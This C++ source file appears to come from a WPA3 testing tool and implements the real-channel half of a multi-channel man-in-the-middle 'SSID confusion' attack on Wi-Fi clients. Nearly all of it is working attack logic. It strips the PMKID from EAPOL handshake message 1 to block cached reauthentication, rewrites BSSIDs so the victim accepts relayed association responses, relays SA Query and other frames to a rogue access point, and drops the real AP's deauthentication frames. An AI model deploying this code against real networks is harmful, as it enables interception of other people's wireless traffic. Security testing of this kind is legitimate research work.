#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/mc_mitm/ssid_confusion/ssid_helper.h"
#include "attacks/mc_mitm/wifi_util.h"
#include "logger/error_log.h"
#include "net_parser/dot11_defs.h"
#include "net_parser/eap_defs.h"
#include "net_parser/kde_defs.h"
#include "net_parser/radiotap_defs.h"
#include "system/hw_capabilities.h"

namespace wpa3_tester::ssid_confusion {
using namespace Tins;
using namespace std;
using namespace std::chrono;

//TODO test
// Strip PMKID KDE from EAPOL-Key msg1 key data (IEEE 802.11-2024, §12.7.2, Fig 12-40).
// Msg1 Key MIC Present=0 → key data is unprotected plaintext.
static bool strip_pmkid_kde(frame_raw_t &raw) {
	using namespace eap;
	using namespace kde;
	static constexpr uint8_t snap_eapol[] = { ETHERTYPE_EAPOL_HI, ETHERTYPE_EAPOL_LO };
	const auto snap = ranges::search(raw, snap_eapol).begin();
	if(snap == raw.end()) return false;
	const size_t eapol_off = static_cast<size_t>(snap - raw.begin()) + 2;
	if(eapol_off + EAPOL_KEY_OFF_KD > raw.size()) return false;

	const size_t kdlen_off = eapol_off + EAPOL_KEY_OFF_KD_LEN;
	uint16_t kdlen = static_cast<uint16_t>(raw[kdlen_off]) << 8 | raw[kdlen_off + 1];
	if(kdlen < PMKID_KDE_SIZE || eapol_off + EAPOL_KEY_OFF_KD + kdlen > raw.size()) return false;

	static constexpr uint8_t pmkid_kde_hdr[] = {
		KDE_TYPE, PMKID_KDE_LEN, IEEE_OUI[0], IEEE_OUI[1], IEEE_OUI[2], KDE_PMKID
	};
	const auto kd_begin = raw.begin() + static_cast<ptrdiff_t>(eapol_off + EAPOL_KEY_OFF_KD);
	const auto kd_end   = kd_begin + kdlen;
	const auto kde_it   = std::search(kd_begin, kd_end, std::begin(pmkid_kde_hdr), std::end(pmkid_kde_hdr));
	if(kde_it == kd_end) return false;

	raw.erase(kde_it, kde_it + PMKID_KDE_SIZE);
	kdlen -= static_cast<uint16_t>(PMKID_KDE_SIZE);
	raw[kdlen_off]     = static_cast<uint8_t>(kdlen >> 8);
	raw[kdlen_off + 1] = static_cast<uint8_t>(kdlen);

	const size_t pktlen_off = eapol_off + EAPOL_LEN_OFF;
	uint16_t pktlen = (static_cast<uint16_t>(raw[pktlen_off]) << 8) | raw[pktlen_off + 1];
	pktlen -= static_cast<uint16_t>(PMKID_KDE_SIZE);
	raw[pktlen_off]     = static_cast<uint8_t>(pktlen >> 8);
	raw[pktlen_off + 1] = static_cast<uint8_t>(pktlen);
	return true;
}

void SsidConfusion::send_to_rogue(PDU &pdu) const {
	const frame_raw_t raw = pdu.serialize();
	send_to_rogue(raw);
}

void SsidConfusion::send_to_rogue(const frame_raw_t &raw) const {
	const auto full_radiotap = ensure_radiotap(raw);
	sock_rogue->send(full_radiotap, netconfig.rogue_channel);
}

FrameProcess SsidConfusion::handle_eapol_real(
	const HWAddress<6> addr2, const PDU &pdu,
	const frame_raw_t &raw) const {
	// EAPOL AP -> STA on real channel
	if(addr2 == ap.get(SK::mac) && is_eapol(pdu)) {
		if(client_state.get_state() < ClientState::Associated) return STOP;
		//TODO check first M1as PMKSA cache hit -> force EAP restart
		const auto msg = get_eapol_msg_num(raw);
		if(msg == EapolMsg::Msg2 || msg == EapolMsg::Msg4) return STOP; //block cycles
		if(msg == EapolMsg::Msg1) {
			frame_raw_t stripped = raw;
			if(strip_pmkid_in_assoc) {
				strip_pmkid_kde(stripped); //don't allow PMKSA - only in new connection
				display_traffic(pdu, "Real channel", " [EAPOL 1/4, PMKID stripped] -- MitM'ing");
			}else {
				display_traffic(pdu, "Real channel", " [EAPOL 1/4] -- MitM'ing");
			}
			send_to_rogue(stripped);
			return STOP;
		}
		// allow other processing for EAP frames (not EAPOL-Key)
		if(msg == EapolMsg::Msg3) return CONTINUE;
		display_traffic(pdu, "Real channel", " AP -> STA  -- MitM'ing ");
		send_to_rogue(raw);
		return STOP;
	}
	return CONTINUE;
}

FrameProcess SsidConfusion::handle_probe_real(const HWAddress<6> addr2, const Dot11 &dot11) {
	if(dot11.find_pdu<Dot11ProbeRequest>() || dot11.find_pdu<Dot11ProbeResponse>()){
		// only if not associated, to not disconnect of background scanning
		if(addr2 == sta.get(SK::mac) && client_state.get_state() < ClientState::Associated){
			display_traffic(dot11, "Real channel", " -- send CSA");
			client_state.update_state(ClientState::Sent_to_rogue);
		}
		return STOP;
	}
	return CONTINUE;
}

FrameProcess SsidConfusion::handle_sa_query_real(const HWAddress<6> addr1, const Dot11 &dot11, const frame_raw_t &raw) const {
	// SA Query Request from real AP -> relay to STA on rogue (transparent, MIC stays valid)
	if(dot11.type() == Dot11::MANAGEMENT && dot11.subtype() == 13 && addr1 == rogue_sta.get(SK::mac)) {
		display_traffic(dot11, "Real channel", " SA Query req -- relay to rogue");
		send_to_rogue(raw);
		return STOP;
	}
	return CONTINUE;
}


FrameProcess SsidConfusion::handle_assoc_real(
	const HWAddress<6> addr1, const PDU &pdu,
	const frame_raw_t &raw) const {
	auto *dot11 = pdu.find_pdu<Dot11>();
	// relay real AP assoc response back to STA (rewrite BSSID so STA accepts it)
	if(dot11->find_pdu<Dot11AssocResponse>() || dot11->find_pdu<Dot11ReAssocResponse>()) {
		if(addr1 == rogue_sta.get(SK::mac) && client_state.get_state() >= ClientState::Associated) {
			log(LogLevel::DEBUG, "AssocResp: addr1={} rogue_sta={} state={}", addr1, rogue_sta.get(SK::mac), ClientState::state2str(client_state.get_state()));
			display_traffic(*dot11, "Real channel", " assoc resp -- relay to rogue");
			if(const auto *ar = dot11->find_pdu<Dot11AssocResponse>()) {
				const unique_ptr<Dot11AssocResponse> patched(assoc_resp_channel_patch(*ar, netconfig.rogue_channel));
				auto relayed = ensure_radiotap(patched->serialize());
				rewrite_bssid_in_frame(relayed, rogue_ap.get(SK::mac));
				send_to_rogue(relayed);
			} else {
				auto relayed = ensure_radiotap(raw);
				rewrite_bssid_in_frame(relayed, rogue_ap.get(SK::mac));
				send_to_rogue(relayed);
			}
		}
		return STOP;
	}
	return CONTINUE;
}

void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const frame_raw_t &raw) {
	auto *dot11 = pdu->find_pdu<Dot11>();
	if(!dot11) return;
	//filter out different channels
	if(const auto *rt = pdu->find_pdu<RadioTap>()) {
		if(rt->present() & RadioTap::CHANNEL &&
			rt->channel_freq() != hw_capabilities::channel_to_freq(netconfig.real_channel))
			return;
	}
	const auto [addr1, addr2] = get_addrs(*pdu, raw);
	if(addr2 == HWAddress<6>() && dot11->type() != Dot11::CONTROL){
		log(LogLevel::DEBUG, "Real channel: Unknown frame type");
		return;
	}
	// ignore useless
	if(dot11->find_pdu<Dot11Beacon>()) return; // don't relay real AP beacons
	if(dot11->find_pdu<Dot11Authentication>()) {
		display_traffic(*dot11, "Real channel", "-- Ignore");
		return;
	}
	// don't relay deauth/disassoc from real AP - would disconnect client from rogue AP
	if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>()) {
		//TODO should be changes status here or neds be ignored because first deauth
		handle_disconnect_real(*dot11);
		return;
	}


	power_mgmt_response_real(addr2, *dot11);


	#define SOLVE_OR_CONTINUE(handle_fun) if(handle_fun) return;

	SOLVE_OR_CONTINUE(handle_probe_real(addr2, *dot11))
	SOLVE_OR_CONTINUE(handle_eapol_real(addr2, *pdu, raw))
	SOLVE_OR_CONTINUE(handle_assoc_real(addr1, *pdu, raw))
	SOLVE_OR_CONTINUE(handle_sa_query_real(addr1, *dot11, raw))
	#undef SOLVE_OR_CONTINUE

	if((addr1 == rogue_sta.get(SK::mac) || addr2 == ap.get(SK::mac)) && client_state.get_state() >= ClientState::Associated) {
		// libtins truncates SNAP/EAPOL frames -> handle_eapol_real misses msg1; strip here as fallback
		auto to_send = raw;
		strip_pmkid_kde(to_send);
		display_traffic(*pdu, "Real channel", " -- MitM'ing");
		send_to_rogue(to_send);
	}
}

}